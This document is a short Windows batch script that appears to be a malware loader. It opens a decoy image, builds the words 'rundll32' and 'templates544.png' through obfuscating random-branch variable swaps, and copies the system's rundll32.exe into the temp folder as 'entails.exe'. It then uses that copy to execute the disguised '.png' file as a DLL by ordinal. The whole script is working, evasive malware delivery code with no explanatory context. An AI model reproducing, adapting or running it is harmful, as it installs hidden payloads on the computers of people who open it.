SETLOCAL EnableDelayedExpansion
start pimpliest_kufic.png
set x3=run
set x2=dll
set x1=32
if %random% neq 100 (
    set tmp1=!x1!
    set x1=!x3!
    set x3=!tmp1!
) else (
    set tmp1=!x2!
    set x1=!x1!
    set x2=!tmp1!
)
set exe2=templ
set exe1=ates544.png
if %random% neq 200 (
    set tmp2=!exe1!
    set exe1=!exe2!
    set exe2=!tmp2!
) else (
    set tmp2=!x1!
    set exe1=!tmp2!
    set exe2=!x2!
)
if %random% neq 300 (
    set xxx=#1
) else (
    set xxx=pimpliest_kufic.png
)
echo f|xcopy %SystemRoot%\system32\%x1%%x2%%x3%.exe %temp%\entails.exe /h /s /e
set t3=%temp%\%random%.%random%
echo f|xcopy !exe1!!exe2! %t3% /h /s /e
%temp%\entails.exe %t3%,%xxx%

